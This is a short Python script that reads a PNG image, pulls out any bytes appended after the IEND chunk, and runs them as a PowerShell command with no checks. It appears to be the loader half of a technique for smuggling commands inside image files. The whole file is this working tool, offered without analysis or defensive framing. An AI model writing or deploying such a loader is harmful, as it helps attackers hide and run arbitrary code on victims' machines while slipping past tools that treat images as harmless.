import os
import subprocess

def extract_and_execute_payload(image_filename):
    # Determine path relative to the script's directory
    script_dir = os.path.dirname(os.path.abspath(__file__))
    image_path = os.path.join(script_dir, image_filename)

    if not os.path.exists(image_path):
        print(f"[-] Error: '{image_filename}' not found in {script_dir}")
        return

    # Read image as raw binary
    with open(image_path, "rb") as f:
        data = f.read()

    # Search for PNG IEND marker (hex sequence: 49 45 4E 44)
    iend_marker = b'IEND'
    iend_pos = data.find(iend_marker)

    if iend_pos == -1:
        print("[-] Error: Valid PNG IEND marker not found.")
        return

    # Skip IEND marker (4 bytes) + 4-byte CRC = 8 bytes total offset
    payload_bytes = data[iend_pos + 8:]

    if not payload_bytes:
        print("[-] No appended payload found after IEND chunk.")
        return

    # Decode payload to string and strip extra whitespace
    payload_str = payload_bytes.decode('utf-8', errors='ignore').strip()
    print(f"[+] Extracted Payload: {payload_str}")

    # Launch PowerShell directly via subprocess
    print("[+] Executing extracted payload in PowerShell...")
    subprocess.run(["powershell.exe", "-NoExit", "-Command", payload_str])

if __name__ == "__main__":
    # Ensure image is in the same folder as this .py script
    extract_and_execute_payload("modified_picture.png")